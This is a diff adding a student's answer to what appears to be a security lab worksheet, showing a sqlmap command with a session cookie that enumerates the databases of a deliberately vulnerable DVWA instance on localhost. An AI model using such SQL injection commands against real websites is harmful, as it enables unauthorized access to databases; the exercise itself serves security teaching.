@@ -99,6 +99,17 @@ output screenshot (optional)
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
 
+**Idenrify a vulnerable URL** : Navigate to the DVWA SQL Injection page and find a URL that includes a parameter
+http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit.
+
+**Run sqlmap to enumerate databases:**
+Find PHPSESSID :
+
+```
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<veum4ka5g5rqc8rcnghg20ch00>; security=low" --dbs
+
+```
+
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
 
